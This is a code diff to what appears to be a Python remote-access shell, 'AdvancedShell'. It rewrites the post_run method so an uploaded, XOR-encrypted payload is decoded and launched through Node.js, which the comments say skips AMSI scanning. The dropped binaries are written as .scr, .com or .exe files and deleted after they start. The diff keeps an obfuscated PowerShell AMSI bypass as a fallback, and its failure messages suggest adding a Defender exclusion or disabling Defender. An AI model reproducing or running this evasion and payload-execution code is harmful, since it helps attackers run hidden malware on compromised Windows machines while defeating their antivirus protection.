@@ -838,9 +838,8 @@ class AdvancedShell:
         else:print(f"{G}[+] Kill command sent{W}")
 
     def post_run(self,name,args=''):
-        """Evasive execution: decode XOR'd .tmp in-memory → try multiple methods."""
+        """Evasive execution: decode XOR'd .tmp via Node.js (bypasses AMSI entirely)."""
         if name not in self.upload_meta:
-            # Check if it's a direct .tmp path
             print(f"{R}[!] No upload metadata for '{name}'. Use .upload first, or specify the .tmp path and XOR key:{W}")
             print(f"  {Y}.runraw <path.tmp> <xor_key_hex> [args]{W}")
             return
@@ -851,73 +850,66 @@ class AdvancedShell:
             print(f"{R}[!] .tmp file gone: {tmp_path} — re-upload needed{W}")
             return
         print(f"{Y}[*] Evasive execution: {name} (XOR=0x{xor_key:02X}){W}")
-        # Obfuscated AMSI bypass
-        amsi=(
-            "try{$a=[Ref].Assembly.GetType('System.Ma'+'nagement.Auto'+'mation.Am'+'siUtils');"
-            "$f=$a.GetField('am'+'siInit'+'Failed','NonPublic,Static');"
-            "$f.SetValue($null,$true)}catch{}"
-        )
-        # Base decode+XOR script (used by all methods)
-        decode_var=(
-            f"$b=[Convert]::FromBase64String((gc '{tmp_path}' -Raw));"
-            f"for($i=0;$i-lt$b.Length;$i++){{$b[$i]=$b[$i]-bxor{xor_key}}}"
-        )
+        print(f"  {DIM}Using Node.js decode (bypasses AMSI completely){W}")
         cwd=self.current_dir.replace('\\','/') if self.current_dir else 'C:/Temp'
         import random
         rnd=random.randint(1000,9999)
+        # Node.js decode script — NOT monitored by AMSI
+        # Reads .tmp → base64 decode → XOR decrypt → write binary → spawn process → self-delete
+        args_js=f",'{args}'" if args else ""
+        node_decode_base=(
+            f"var f=require('fs'),c=require('child_process');"
+            f"var d=f.readFileSync('{tmp_path}','utf8').replace(/\\\\r|\\\\n/g,'');"
+            f"var b=Buffer.from(d,'base64');"
+            f"for(var i=0;i<b.length;i++)b[i]^={xor_key};"
+        )
         methods=[
-            ('ADS stream',
-             f"powershell -c \"{amsi};{decode_var};"
-             f"$p='{cwd}/desktop.ini';"
-             f"if(!(Test-Path $p)){{Set-Content $p '' -Force}};"
-             f"$s=$p+':svc{rnd}';"
-             f"[IO.File]::WriteAllBytes($s,$b);"
-             f"Start-Process $s {('-ArgumentList \x27'+args+'\x27' if args else '')}\""),
-            ('.scr (screensaver)',
-             f"powershell -c \"{amsi};{decode_var};"
-             f"$p='{cwd}/upd{rnd}.scr';"
-             f"[IO.File]::WriteAllBytes($p,$b);"
-             f"Start-Process $p {('-ArgumentList \x27'+args+'\x27' if args else '')};"
-             f"Start-Sleep 3;Remove-Item $p -Force -EA 0\""),
-            ('.com (legacy)',
-             f"powershell -c \"{amsi};{decode_var};"
-             f"$p='{cwd}/svc{rnd}.com';"
-             f"[IO.File]::WriteAllBytes($p,$b);"
-             f"Start-Process $p {('-ArgumentList \x27'+args+'\x27' if args else '')};"
-             f"Start-Sleep 3;Remove-Item $p -Force -EA 0\""),
-            ('.exe race',
-             f"powershell -c \"{amsi};{decode_var};"
-             f"$p='{cwd}/win{rnd}.exe';"
-             f"[IO.File]::WriteAllBytes($p,$b);"
-             f"Start-Process $p {('-ArgumentList \x27'+args+'\x27' if args else '')};"
-             f"Start-Sleep 2;Remove-Item $p -Force -EA 0\""),
+            ('Node.js → .scr', f".scr", f"upd{rnd}.scr"),
+            ('Node.js → .com', f".com", f"svc{rnd}.com"),
+            ('Node.js → .exe', f".exe", f"win{rnd}.exe"),
         ]
-        for method_name,cmd in methods:
+        for method_name,ext,fname in methods:
+            out_path=f"{cwd}/{fname}"
+            # Node.js: decode → write → spawn → schedule delete
+            node_cmd=(
+                f"node -e \""
+                f"{node_decode_base}"
+                f"f.writeFileSync('{out_path}',b);"
+                f"c.exec('start /b \\\"\\\" \\\"{out_path}\\\"'{args_js});"
+                f"setTimeout(function(){{try{{f.unlinkSync('{out_path}')}}catch(e){{}}}},5000)"
+                f"\""
+            )
             print(f"  {Y}[*] Trying {method_name}...{W}",end=' ',flush=True)
-            o=self.execute(cmd)
-            if o and ('denied' in o.lower() or 'error' in o.lower() or 'blocked' in o.lower() or '[-]' in o):
-                print(f"{R}failed{W}")
-                continue
-            # Check if process spawned
+            o=self.execute(node_cmd)
+            if o and '[-]' in o:
+                print(f"{R}no response{W}");continue
             import time as _t;_t.sleep(2)
-            ps_check=self.execute(f'powershell -c "Get-Process | Where-Object {{$_.Path -like \x27*{rnd}*\x27}} | Select-Object -First 1 Id,ProcessName"')
-            if ps_check and ps_check.strip() and '[-]' not in ps_check:
-                print(f"{G}RUNNING ✓{W}")
-                print(f"  {C}Process:{W} {ps_check.strip()}")
-                return
-            # Alternate check: any new process with our random number
-            tl=self.execute(f'tasklist | findstr "{rnd}"')
+            tl=self.execute(f'tasklist 2>nul | findstr "{fname}"')
             if tl and tl.strip() and '[-]' not in tl:
                 print(f"{G}RUNNING ✓{W}")
                 print(f"  {C}Process:{W} {tl.strip().split(chr(10))[0]}")
                 return
-            print(f"{Y}no process detected{W}")
-        # All methods failed
-        print(f"{R}[!] All evasive methods failed.{W}")
-        print(f"  {Y}Suggestions:{W}")
-        print(f"  1. .exclude {cwd}  — add Defender exclusion, then .run {name} again")
-        print(f"  2. .avoff           — try disabling Defender RT")
-        print(f"  3. Manual: the .tmp is still at {tmp_path} (XOR key=0x{xor_key:02X})")
+            fchk=self.execute(f'if exist "{out_path}" (echo ALIVE) else (echo GONE)')
+            if fchk and 'GONE' in fchk:
+                print(f"{Y}Defender removed {ext}{W}");continue
+            print(f"{Y}process not detected{W}")
+        # Fallback: PowerShell with AMSI bypass
+        print(f"  {Y}[*] Trying PowerShell (AMSI bypass)...{W}",end=' ',flush=True)
+        amsi="try{$a=[Ref].Assembly.GetType('System.Ma'+'nagement.Auto'+'mation.Am'+'siUtils');$f=$a.GetField('am'+'siInit'+'Failed','NonPublic,Static');$f.SetValue($null,$true)}catch{}"
+        ps_out=f"{cwd}/svc{rnd}.scr"
+        ps_cmd=f"powershell -c \"{amsi};$b=[Convert]::FromBase64String((gc '{tmp_path}' -Raw));for($i=0;$i-lt$b.Length;$i++){{$b[$i]=$b[$i]-bxor{xor_key}}};[IO.File]::WriteAllBytes('{ps_out}',$b);Start-Process '{ps_out}';Start-Sleep 3;Remove-Item '{ps_out}' -Force -EA 0\""
+        self.execute(ps_cmd)
+        import time as _t;_t.sleep(2)
+        tl=self.execute(f'tasklist 2>nul | findstr "{rnd}"')
+        if tl and tl.strip() and '[-]' not in tl:
+            print(f"{G}RUNNING ✓{W}")
+            print(f"  {C}Process:{W} {tl.strip().split(chr(10))[0]}")
+            return
+        print(f"{Y}no process{W}")
+        print(f"{R}[!] All methods failed.{W}")
+        print(f"  {Y}1. .exclude {cwd} then .run {name}{W}")
+        print(f"  {Y}2. .avoff then .run {name}{W}")
+        print(f"  {Y}3. .tmp at: {tmp_path} (XOR=0x{xor_key:02X}){W}")
 
     def post_runraw(self,tmp_path,xor_key_hex,args=''):
         """Run from a .tmp with manually specified XOR key."""
